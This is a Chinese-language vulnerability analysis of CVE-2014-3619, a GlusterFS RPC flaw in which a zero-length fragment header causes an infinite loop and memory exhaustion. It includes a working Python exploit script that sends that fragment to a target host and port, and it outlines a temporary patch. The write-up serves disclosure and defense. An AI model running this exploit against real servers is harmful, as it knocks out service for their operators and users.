# glusterfs 远程拒绝服务漏洞分析【CVE-2014-3619】

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzkzOTIyMzYyMg==&mid=2247487983&idx=1&sn=70ac4bc7abf2c1eef9cf82b034d94f75&chksm=c2f56ec6f582e7d03cb12e31c47946797147b8fb4efe1e67bcccdf710128b04d234db77a0b67&scene=126&sessionid=1681377469#rd](http://mp.weixin.qq.com/s?__biz=MzkzOTIyMzYyMg==&mid=2247487983&idx=1&sn=70ac4bc7abf2c1eef9cf82b034d94f75&chksm=c2f56ec6f582e7d03cb12e31c47946797147b8fb4efe1e67bcccdf710128b04d234db77a0b67&scene=126&sessionid=1681377469#rd)

Glusterfs一款是开源的分布式文件系统软件，此次发现的漏洞影响Glusterfs 3.3.0之后的版本，该漏洞会造成Glusterfs服务端内存异常，导致拒绝服务。

  

该漏洞是openvas扫描Glusterfs集群造成服务器异常之后，通过代码审计的方式发现的。

在审计的过程中，我们发现Glusterfs服务端的在处理rpc的代码存在逻辑错误，并未虑长度到fragment header中长度值为0的情况，当发生这种情况时，代码将进入无限循环，很快耗尽内存。相关代码的注释如下：

触发该漏洞只需向Glusterfs服务端发送内容为0的字符串，exp.py的代码如下：

import socket

import struct

import sys

 

#python exp.py ipport

#example: pythonexp.py 127.0.0.1 49112

fragment = struct.pack("I", 0)

 

address =(sys.argv\[1\], int(sys.argv\[2\]))

s =socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)

s.connect(address)

s.send( fragment )

s.close()

 

 

修补该漏洞的临时方案为：判断RPC\_FRAGSIZE (in->fraghdr)为0时，退出处理流程。patch内容如下：
